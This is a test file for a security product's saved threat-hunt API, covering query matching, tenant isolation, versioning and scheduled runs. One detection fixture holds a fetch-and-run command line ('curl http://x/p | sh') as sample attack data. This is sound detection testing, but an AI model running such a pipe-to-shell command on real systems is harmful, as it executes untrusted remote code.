import { afterAll, beforeEach, describe, expect, it } from "vitest";
import { NextRequest } from "next/server";
import {
  cleanDatabase,
  createTestAgent,
  createTestDetection,
  createTestTenant,
  prisma,
} from "../helpers/db";
import { createTenantHeaders } from "../helpers/http";
import { GET as listHunts, POST as createHunt } from "@/app/api/hunts/route";
import { DELETE as deleteHunt, GET as getHunt, PATCH as patchHunt } from "@/app/api/hunts/[id]/route";
import { POST as runHuntRoute } from "@/app/api/hunts/[id]/run/route";
import { GET as runHuntsCron } from "@/app/api/cron/run-hunts/route";
import { HUNT_RUNS_KEPT, dueHunts, pruneHuntRuns, runHunt } from "@/lib/hunt";

const HOUR = 3_600_000;
const query = { version: 1, lastHours: 24, techniques: ["T1059"] };

function req(url: string, tenantId: string, method = "GET", body?: unknown) {
  return new NextRequest(`http://localhost${url}`, {
    method,
    headers: createTenantHeaders(tenantId, "analyst-1"),
    body: body === undefined ? undefined : JSON.stringify(body),
  });
}
const ctx = (id: string) => ({ params: { id } });

async function create(tenantId: string, extra: Record<string, unknown> = {}) {
  const res = await createHunt(req("/api/hunts", tenantId, "POST", { name: "h", query, ...extra }));
  expect(res.status).toBe(201);
  return (await res.json()).hunt as { id: string; version: number };
}

describe("saved hunts (real database)", () => {
  beforeEach(async () => {
    await cleanDatabase();
  });
  afterAll(async () => {
    await cleanDatabase();
    await prisma.$disconnect();
  });

  it("creates a hunt owned by the session user, and lists it with its latest run", async () => {
    const tenant = await createTestTenant();
    const hunt = await create(tenant.id, { scheduleMinutes: 60 });
    const row = await prisma.hunt.findUniqueOrThrow({ where: { id: hunt.id } });
    expect(row).toMatchObject({ ownerId: "analyst-1", version: 1, scheduleMinutes: 60, active: true });

    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));
    const listed = (await (await listHunts(req("/api/hunts", tenant.id))).json()).hunts;
    expect(listed).toHaveLength(1);
    expect(listed[0].lastRun).toMatchObject({ trigger: "manual", matchCount: 0 });
  });

  it("rejects an invalid body with 400 and never reaches the database", async () => {
    const tenant = await createTestTenant();
    const bad = [
      { name: "h", query: { ...query, lastHours: 0 } },
      { name: "h", query, tenantId: "someone-else" },
      { name: "", query },
    ];
    for (const body of bad) {
      expect((await createHunt(req("/api/hunts", tenant.id, "POST", body))).status).toBe(400);
    }
    expect(await prisma.hunt.count()).toBe(0);
  });

  it("counts matches in the window, by technique, severity, host and text", async () => {
    const tenant = await createTestTenant();
    const a = await createTestAgent(tenant.id);
    const b = await createTestAgent(tenant.id);
    const now = Date.now();
    await createTestDetection(tenant.id, a.id, { technique: "T1059.001", severity: "high", timestamp: new Date(now - HOUR), event: { cmdline: "curl http://x/p | sh" } });
    await createTestDetection(tenant.id, a.id, { technique: "T1059.004", severity: "low", timestamp: new Date(now - 2 * HOUR), event: { cmdline: "ls" } });
    await createTestDetection(tenant.id, b.id, { technique: "T1105", severity: "high", timestamp: new Date(now - HOUR), event: { cmdline: "wget x" } });
    await createTestDetection(tenant.id, a.id, { technique: "T1059.001", severity: "high", timestamp: new Date(now - 48 * HOUR) }); // outside the window

    const run = async (q: object) => {
      const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "h", query: { version: 1, lastHours: 24, ...q } } });
      return runHunt(prisma, hunt, "manual");
    };
    expect((await run({ techniques: ["T1059"] })).matchCount).toBe(2);
    expect((await run({ techniques: ["T1059.001"] })).matchCount).toBe(1);
    expect((await run({ severities: ["high"] })).matchCount).toBe(2);
    expect((await run({ agentIds: [b.id] })).matchCount).toBe(1);
    expect((await run({ text: "CURL" })).matchCount).toBe(1);
    expect((await run({ text: "curl", severities: ["low"] })).matchCount).toBe(0);
    expect((await run({})).matchCount).toBe(3);
  });

  it("matches text literally: % and _ are not wildcards", async () => {
    const tenant = await createTestTenant();
    const a = await createTestAgent(tenant.id);
    await createTestDetection(tenant.id, a.id, { event: { cmdline: "echo 100%_done" } });
    await createTestDetection(tenant.id, a.id, { event: { cmdline: "echo 1000 done" } });
    const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "h", query: { version: 1, lastHours: 24, text: "100%_done" } } });
    expect((await runHunt(prisma, hunt, "manual")).matchCount).toBe(1);
  });

  it("never matches another tenant's detections", async () => {
    const mine = await createTestTenant();
    const theirs = await createTestTenant();
    const theirAgent = await createTestAgent(theirs.id);
    await createTestDetection(theirs.id, theirAgent.id, { technique: "T1059.001" });
    const hunt = await create(mine.id);
    const run = (await (await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, mine.id, "POST"), ctx(hunt.id))).json()).run;
    expect(run.matchCount).toBe(0);
    // Naming the other tenant's agent in the query does not help either.
    const spy = await createTestAgent(theirs.id);
    const sneaky = await prisma.hunt.create({ data: { tenantId: mine.id, ownerId: "u", name: "h", query: { version: 1, lastHours: 24, agentIds: [spy.id] } } });
    expect((await runHunt(prisma, sneaky, "manual")).matchCount).toBe(0);
  });

  it("keeps another tenant's hunt out of reach: 404 on read, update, run and delete", async () => {
    const mine = await createTestTenant();
    const theirs = await createTestTenant();
    const hunt = await create(theirs.id);
    expect((await getHunt(req(`/api/hunts/${hunt.id}`, mine.id), ctx(hunt.id))).status).toBe(404);
    expect((await patchHunt(req(`/api/hunts/${hunt.id}`, mine.id, "PATCH", { active: false }), ctx(hunt.id))).status).toBe(404);
    expect((await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, mine.id, "POST"), ctx(hunt.id))).status).toBe(404);
    expect((await deleteHunt(req(`/api/hunts/${hunt.id}`, mine.id, "DELETE"), ctx(hunt.id))).status).toBe(404);
    expect(await prisma.hunt.count({ where: { id: hunt.id } })).toBe(1);
  });

  it("counts a match as new only if it was ingested since the previous run started", async () => {
    const tenant = await createTestTenant();
    const a = await createTestAgent(tenant.id);
    await createTestDetection(tenant.id, a.id, { technique: "T1059.001" });
    const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "h", query } });
    const pause = () => new Promise((r) => setTimeout(r, 25));

    await pause();
    expect(await runHunt(prisma, hunt, "manual")).toMatchObject({ matchCount: 1, newMatchCount: 1 });
    await pause();
    expect(await runHunt(prisma, hunt, "manual")).toMatchObject({ matchCount: 1, newMatchCount: 0 });
    await pause();
    await createTestDetection(tenant.id, a.id, { technique: "T1059.004" });
    await pause();
    expect(await runHunt(prisma, hunt, "manual")).toMatchObject({ matchCount: 2, newMatchCount: 1 });
  });

  it("bumps the version only when the query changes, and past runs keep the version they ran", async () => {
    const tenant = await createTestTenant();
    const hunt = await create(tenant.id);
    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));

    const rename = await patchHunt(req(`/api/hunts/${hunt.id}`, tenant.id, "PATCH", { name: "renamed", query: { ...query, techniques: ["T1059"] } }), ctx(hunt.id));
    expect((await rename.json()).hunt.version).toBe(1);

    const edit = await patchHunt(req(`/api/hunts/${hunt.id}`, tenant.id, "PATCH", { query: { ...query, lastHours: 48 } }), ctx(hunt.id));
    expect((await edit.json()).hunt.version).toBe(2);
    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));

    const history = (await (await getHunt(req(`/api/hunts/${hunt.id}`, tenant.id), ctx(hunt.id))).json()).runs;
    expect(history.map((r: { queryVersion: number }) => r.queryVersion)).toEqual([2, 1]);
    expect(history[1].query.lastHours).toBe(24);
  });

  it("records a hunt whose stored query no longer parses as a failed run, and the cron carries on", async () => {
    const tenant = await createTestTenant();
    const broken = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "broken", query: { version: 1, lastHours: 0 }, scheduleMinutes: 60 } });
    const fine = await create(tenant.id, { scheduleMinutes: 60 });

    const run = await runHunt(prisma, broken, "manual");
    expect(run.error).toContain("lastHours");
    expect(run).toMatchObject({ matchCount: 0, newMatchCount: 0 });

    const res = await runHuntsCron(new NextRequest("http://localhost/api/cron/run-hunts", { headers: { Authorization: `Bearer ${process.env.CRON_SECRET}` } }));
    expect(await res.json()).toMatchObject({ ran: 1, failed: 0 });
    expect(await prisma.huntRun.count({ where: { huntId: fine.id, error: null } })).toBe(1);
  });

  it("the cron runs only due scheduled hunts, and prunes history", async () => {
    const tenant = await createTestTenant();
    const never = await create(tenant.id, { scheduleMinutes: 60 });
    const fresh = await create(tenant.id, { scheduleMinutes: 60 });
    const stale = await create(tenant.id, { scheduleMinutes: 60 });
    await create(tenant.id); // manual only
    const paused = await create(tenant.id, { scheduleMinutes: 5, active: false });
    const now = Date.now();
    await prisma.huntRun.create({ data: { huntId: fresh.id, tenantId: tenant.id, startedAt: new Date(now - 10 * 60_000), queryVersion: 1, query, sampleDetectionIds: [], trigger: "manual" } });
    await prisma.huntRun.create({ data: { huntId: stale.id, tenantId: tenant.id, startedAt: new Date(now - 2 * HOUR), queryVersion: 1, query, sampleDetectionIds: [], trigger: "manual" } });

    expect((await dueHunts(prisma)).map((h) => h.id).sort()).toEqual([never.id, stale.id].sort());

    const res = await runHuntsCron(new NextRequest("http://localhost/api/cron/run-hunts", { headers: { Authorization: `Bearer ${process.env.CRON_SECRET}` } }));
    expect(await res.json()).toMatchObject({ due: 2, ran: 2, failed: 0 });
    expect(await prisma.huntRun.count({ where: { huntId: never.id, trigger: "schedule" } })).toBe(1);
    expect(await prisma.huntRun.count({ where: { huntId: paused.id } })).toBe(0);
    expect(await prisma.huntRun.count({ where: { huntId: fresh.id } })).toBe(1);

    const again = await runHuntsCron(new NextRequest("http://localhost/api/cron/run-hunts", { headers: { Authorization: `Bearer ${process.env.CRON_SECRET}` } }));
    expect(await again.json()).toMatchObject({ due: 0, ran: 0 });
  });

  it("refuses the cron without the secret", async () => {
    const res = await runHuntsCron(new NextRequest("http://localhost/api/cron/run-hunts"));
    expect([401, 503]).toContain(res.status);
  });

  it("keeps only the newest runs of each hunt", async () => {
    const tenant = await createTestTenant();
    const hunt = await create(tenant.id);
    const other = await create(tenant.id);
    const data = (huntId: string, i: number) => ({ huntId, tenantId: tenant.id, startedAt: new Date(Date.UTC(2026, 0, 1) + i * 1000), queryVersion: 1, query, sampleDetectionIds: [], trigger: "schedule" });
    await prisma.huntRun.createMany({ data: Array.from({ length: HUNT_RUNS_KEPT + 5 }, (_, i) => data(hunt.id, i)) });
    await prisma.huntRun.createMany({ data: [data(other.id, 0)] });

    expect(await pruneHuntRuns(prisma)).toBe(5);
    expect(await prisma.huntRun.count({ where: { huntId: hunt.id } })).toBe(HUNT_RUNS_KEPT);
    const oldest = await prisma.huntRun.findFirstOrThrow({ where: { huntId: hunt.id }, orderBy: { startedAt: "asc" } });
    expect(oldest.startedAt).toEqual(new Date(Date.UTC(2026, 0, 1) + 5 * 1000));
    expect(await prisma.huntRun.count({ where: { huntId: other.id } })).toBe(1);
  });

  it("deleting a hunt deletes its history", async () => {
    const tenant = await createTestTenant();
    const hunt = await create(tenant.id);
    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));
    expect((await deleteHunt(req(`/api/hunts/${hunt.id}`, tenant.id, "DELETE"), ctx(hunt.id))).status).toBe(204);
    expect(await prisma.huntRun.count()).toBe(0);
  });
});
